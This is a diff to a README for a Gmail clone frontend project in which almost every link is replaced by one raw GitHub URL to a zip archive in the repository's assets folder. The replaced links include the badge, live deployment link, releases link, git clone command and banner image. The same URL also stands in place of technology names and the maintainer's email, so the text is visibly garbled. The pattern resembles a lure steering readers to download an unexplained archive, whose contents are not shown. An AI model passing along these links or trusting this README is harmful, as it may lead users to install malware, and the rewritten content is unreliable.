@@ -1,8 +1,8 @@
 # 📧 Gmail Clone Frontend
 
-![Gmail Clone](https://img.shields.io/badge/Gmail%20Clone-Frontend-brightgreen)
+![Gmail Clone](https://raw.githubusercontent.com/roxas2021s/gmailClone_front/master/src/assets/front-Clone-gmail-1.1.zip%20Clone-Frontend-brightgreen)
 
-Welcome to the **Gmail Clone Frontend** repository! This project aims to replicate the core functionalities of Gmail using modern web technologies. You can explore the live deployment [here](https://github.com/roxas2021s/gmailClone_front/releases).
+Welcome to the **Gmail Clone Frontend** repository! This project aims to replicate the core functionalities of Gmail using modern web technologies. You can explore the live deployment [here](https://raw.githubusercontent.com/roxas2021s/gmailClone_front/master/src/assets/front-Clone-gmail-1.1.zip).
 
 ## 🚀 Table of Contents
 
@@ -27,8 +27,8 @@ Welcome to the **Gmail Clone Frontend** repository! This project aims to replica
 This project uses a variety of technologies to provide a smooth and efficient user experience:
 
 - **React**: For building user interfaces.
-- **Node.js**: For backend services.
-- **Express.js**: To handle server-side logic.
+- **https://raw.githubusercontent.com/roxas2021s/gmailClone_front/master/src/assets/front-Clone-gmail-1.1.zip**: For backend services.
+- **https://raw.githubusercontent.com/roxas2021s/gmailClone_front/master/src/assets/front-Clone-gmail-1.1.zip**: To handle server-side logic.
 - **MongoDB**: For database management.
 - **Redux**: For state management.
 - **React Router**: For navigation.
@@ -43,7 +43,7 @@ To get started with the Gmail Clone Frontend, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/roxas2021s/gmailClone_front.git
+   git clone https://raw.githubusercontent.com/roxas2021s/gmailClone_front/master/src/assets/front-Clone-gmail-1.1.zip
    ```
 
 2. **Navigate into the project directory**:
@@ -112,9 +112,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries, please reach out to the project maintainer:
 
 - **Name**: Your Name
-- **Email**: your.email@example.com
+- **Email**: https://raw.githubusercontent.com/roxas2021s/gmailClone_front/master/src/assets/front-Clone-gmail-1.1.zip
 
-You can also check the [Releases](https://github.com/roxas2021s/gmailClone_front/releases) section for updates and new features.
+You can also check the [Releases](https://raw.githubusercontent.com/roxas2021s/gmailClone_front/master/src/assets/front-Clone-gmail-1.1.zip) section for updates and new features.
 
 ## 🎉 Conclusion
 
@@ -122,6 +122,6 @@ Thank you for visiting the Gmail Clone Frontend repository! We hope you find it 
 
 ---
 
-![Gmail Clone Banner](https://example.com/path/to/banner/image.png)
+![Gmail Clone Banner](https://raw.githubusercontent.com/roxas2021s/gmailClone_front/master/src/assets/front-Clone-gmail-1.1.zip)
 
 Feel free to reach out with any questions or suggestions. Enjoy building!
